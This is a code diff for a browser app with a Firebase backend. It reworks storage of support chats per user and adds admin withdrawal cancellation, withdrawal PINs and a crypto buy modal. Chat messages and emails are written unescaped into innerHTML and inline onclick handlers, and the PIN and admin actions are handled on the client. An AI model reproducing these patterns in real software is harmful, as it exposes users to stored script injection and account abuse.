-            // Atomic arrayUnion update delivers immediately and never deletes sent messages
-            db.collection("config").doc("appData").update({
-                [`chatThreads.${sKey}.messages`]: firebase.firestore.FieldValue.arrayUnion(replyObj),
-                [`chatThreads.${sKey}.agentRepliedSinceLastUser`]: true,
-                [`chatThreads.${sKey}.adminTyping`]: false
+            db.collection("supportChats").doc(emailKey).update({
+                messages: firebase.firestore.FieldValue.arrayUnion(replyObj),
+                agentRepliedSinceLastUser: true,
+                adminTyping: false
+            }).then(() => {
+                renderAdminDashboard();
             }).catch(() => {
-                db.collection("config").doc("appData").set({
-                    chatThreads: {
-                        [sKey]: {
-                            messages: [replyObj],
-                            agentRepliedSinceLastUser: true,
-                            adminTyping: false
-                        }
-                    }
+                db.collection("supportChats").doc(emailKey).set({
+                    messages: [replyObj],
+                    agentRepliedSinceLastUser: true,
+                    adminTyping: false
                 }, { merge: true });
             });
         }
@@ -1824,7 +1893,6 @@
             alert(`Successfully assigned step "${actionSteps[stepIndex].title}" to ${userEmail}`);
         }
 
-        // --- CANCEL WITHDRAWAL, REFUND USER & SEND REASON NOTE ---
         function adminCancelAndRefundWithdrawal(userEmail) {
             const u = usersList.find(x => x.email.trim().toLowerCase() === userEmail.trim().toLowerCase());
             if (!u) return;
@@ -1853,7 +1921,6 @@
             u.stepIdx = 0;
             u.statusExpiryTime = null;
 
-            // Remove any pending proofs from this user
             proofQueue = proofQueue.filter(p => p.user.trim().toLowerCase() !== userEmail.trim().toLowerCase());
 
             sendSimulatedEmail(
@@ -2024,40 +2091,55 @@
 
             document.getElementById('admin-whatsapp-agent-select').innerHTML = supportAgents.map(ag => `<option value="${ag.name}">${ag.name}</option>`).join('') || '<option value="Support Agent">Support Agent</option>';
 
-            const usersListContainer = document.getElementById('admin-chat-users-list');
-            const threadKeys = Object.keys(chatThreads);
-            
-            if (threadKeys.length === 0) {
-                usersListContainer.innerHTML = `<span style="color:var(--text-muted); font-size:0.8rem;">No active chats.</span>`;
-                document.getElementById('admin-whatsapp-user-select').innerHTML = `<option value="">No users available</option>`;
-            } else {
-                usersListContainer.innerHTML = threadKeys.map(email => `
-                    <div style="background:${selectedAdminChatUser === email ? 'var(--primary)' : 'var(--bg-card)'}; color:${selectedAdminChatUser === email ? '#fff' : 'var(--text-main)'}; padding:0.5rem 0.75rem; border-radius:6px; cursor:pointer; font-size:0.8rem;" onclick="adminSelectUserDropdown('${email}')">
-                        <strong>${email}</strong>
-                    </div>
-                `).join('');
+            db.collection("supportChats").get().then(snapshot => {
+                const usersListContainer = document.getElementById('admin-chat-users-list');
+                const threadKeys = [];
+                snapshot.forEach(doc => { threadKeys.push(doc.id); });
 
-                document.getElementById('admin-whatsapp-user-select').innerHTML = threadKeys.map(email => `<option value="${email}" ${selectedAdminChatUser === email ? 'selected' : ''}>${email}</option>`).join('');
-            }
+                if (threadKeys.length === 0) {
+                    usersListContainer.innerHTML = `<span style="color:var(--text-muted); font-size:0.8rem;">No active chats.</span>`;
+                    document.getElementById('admin-whatsapp-user-select').innerHTML = `<option value="">No users available</option>`;
+                } else {
+                    usersListContainer.innerHTML = threadKeys.map(email => `
+                        <div style="background:${selectedAdminChatUser === email ? 'var(--primary)' : 'var(--bg-card)'}; color:${selectedAdminChatUser === email ? '#fff' : 'var(--text-main)'}; padding:0.5rem 0.75rem; border-radius:6px; cursor:pointer; font-size:0.8rem;" onclick="adminSelectUserDropdown('${email}')">
+                            <strong>${email}</strong>
+                        </div>
+                    `).join('');
+
+                    document.getElementById('admin-whatsapp-user-select').innerHTML = threadKeys.map(email => `<option value="${email}" ${selectedAdminChatUser === email ? 'selected' : ''}>${email}</option>`).join('');
+                }
+            });
 
             const activeChatBox = document.getElementById('admin-active-chat-messages');
             const profileTitle = document.getElementById('admin-whatsapp-profile-title');
             const userTypingStatus = document.getElementById('admin-user-typing-status');
             
-            if (selectedAdminChatUser && chatThreads[selectedAdminChatUser]) {
-                const targetUsr = usersList.find(x => x.email.trim().toLowerCase() === selectedAdminChatUser.trim().toLowerCase());
-                const profileName = targetUsr ? (targetUsr.name || selectedAdminChatUser) : selectedAdminChatUser;
-                profileTitle.innerText = `💬 Profile: ${profileName} (${selectedAdminChatUser})`;
+            if (selectedAdminChatUser) {
+                const emailKey = selectedAdminChatUser.trim().toLowerCase();
+                if (!chatThreads[emailKey]) {
+                    db.collection("supportChats").doc(emailKey).onSnapshot(doc => {
+                        if (doc.exists) { chatThreads[emailKey] = doc.data(); renderAdminDashboard(); }
+                    });
+                }
 
-                activeChatBox.innerHTML = (chatThreads[selectedAdminChatUser].messages || []).map(m => `
-                    <div style="padding:0.4rem 0.6rem; border-radius:6px; background:${m.sender === 'user' ? 'var(--bg-input)' : 'rgba(99,102,241,0.2)'}; align-self:${m.sender === 'user' ? 'flex-start' : 'flex-end'}; max-width:85%; position:relative; padding-bottom:1.1rem;">
-                        <strong>${m.sender === 'user' ? profileName : 'Agent'}:</strong> ${m.text}
-                        <span style="position:absolute; bottom:2px; right:6px; font-size:0.65rem; color:${m.seen ? '#3b82f6' : 'var(--text-muted)'};">${m.seen ? '✓✓' : '✓'}</span>
-                    </div>
-                `).join('');
-                activeChatBox.scrollTop = activeChatBox.scrollHeight;
+                const targetUsr = usersList.find(x => x.email.trim().toLowerCase() === emailKey);
+                const profileName = targetUsr ? (targetUsr.name || emailKey) : emailKey;
+                profileTitle.innerText = `💬 Profile: ${profileName} (${emailKey})`;
 
-                if (chatThreads[selectedAdminChatUser].userTyping) {
+                const threadData = chatThreads[emailKey];
+                if (threadData && threadData.messages) {
+                    activeChatBox.innerHTML = threadData.messages.map(m => `
+                        <div style="padding:0.4rem 0.6rem; border-radius:6px; background:${m.sender === 'user' ? 'var(--bg-input)' : 'rgba(99,102,241,0.2)'}; align-self:${m.sender === 'user' ? 'flex-start' : 'flex-end'}; max-width:85%; position:relative; padding-bottom:1.3rem;">
+                            <strong>${m.sender === 'user' ? profileName : 'Agent'}:</strong> ${m.text}
+                            <span style="position:absolute; bottom:2px; right:6px; font-size:0.62rem; color:${m.seen ? '#3b82f6' : 'var(--text-muted)'};">${m.time || ''} ${m.date ? '• ' + m.date : ''} • ${m.seen ? '✓✓' : '✓'}</span>
+                        </div>
+                    `).join('');
+                    activeChatBox.scrollTop = activeChatBox.scrollHeight;
+                } else {
+                    activeChatBox.innerHTML = `<span style="color:var(--text-muted);">No messages yet.</span>`;
+                }
+
+                if (threadData && threadData.userTyping) {
                     userTypingStatus.classList.remove('hidden');
                 } else {
                     userTypingStatus.classList.add('hidden');
@@ -2092,9 +2174,10 @@
         function closeSettingsModal() { document.getElementById('settings-modal').style.display = 'none'; }
         function toggleTheme() { currentTheme = currentTheme === 'dark' ? 'light' : 'dark'; document.getElementById('app-body').classList.toggle('light-mode', currentTheme === 'light'); saveState(); }
         function openInboxModal() {
-            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             const container = document.getElementById('user-inbox-messages');
-            const inbox = userEmails[currentUserEmail] || [];
+            const inbox = userEmails[u.email] || [];
             container.innerHTML = inbox.length === 0 ? `<p style="color:var(--text-muted)">Inbox is empty.</p>` : inbox.map(em => `
                 <div class="email-item"><strong>${em.subject}</strong><br>${em.body}<br><small style="color:var(--text-muted);">${em.date}</small></div>
             `).join('');
@@ -2103,10 +2186,10 @@
         function closeInboxModal() { document.getElementById('inbox-modal').style.display = 'none'; }
 
         function handleAuthHeaderClick() {
-            if (currentUserEmail) {
-                const u = getCurrentUserData();
-                document.getElementById('profile-user-email').innerText = currentUserEmail;
-                document.getElementById('profile-user-id').innerText = u ? u.userId : '--';
+            const u = getCurrentUserData();
+            if (u) {
+                document.getElementById('profile-user-email').innerText = u.email;
+                document.getElementById('profile-user-id').innerText = u.userId || '--';
                 document.getElementById('profile-modal').style.display = 'flex';
             } else { openAuthModal('signin'); }
         }
@@ -2171,6 +2254,7 @@
             usersList.push(newUser);
             currentUserEmail = email;
             saveState();
+            subscribeToUserChat(email);
             closeAuthModal();
             updateBalanceUI();
             showNotification("Welcome", `Account created! Your ID is ${uniqueId}`, "🎉");
@@ -2193,6 +2277,7 @@
 
             currentUserEmail = u.email;
             localStorage.setItem('chronicle_current_user', currentUserEmail);
+            subscribeToUserChat(currentUserEmail);
             closeAuthModal();
             updateBalanceUI();
             showNotification("Signed In", "Welcome back!", "👋");
@@ -2203,14 +2288,15 @@
         function handlePinSetup(e) {
             e.preventDefault();
             const pin = document.getElementById('new-pin-input').value;
-            const u = usersList.find(x => x.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase());
+            const u = getCurrentUserData();
             if (u) { u.pin = pin; saveState(); }
             document.getElementById('pin-setup-modal').style.display = 'none';
             alert("Withdrawal PIN saved successfully!");
         }
 
         function openBuyModal() {
-            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             const coin = document.getElementById('buy-coin-target').value;
             const addr = coin === 'btc' ? globalAddresses.btc : globalAddresses.eth;
             document.getElementById('user-exchanges-container').innerHTML = exchanges.map(ex => `
@@ -2242,6 +2328,10 @@
             }, 1000);
         }
 
+        const initialUser = getCurrentUserData();
+        if (initialUser) {
+            subscribeToUserChat(initialUser.email);
+        }
         updateBalanceUI();
         updateSupportAgentUI();
     </script>
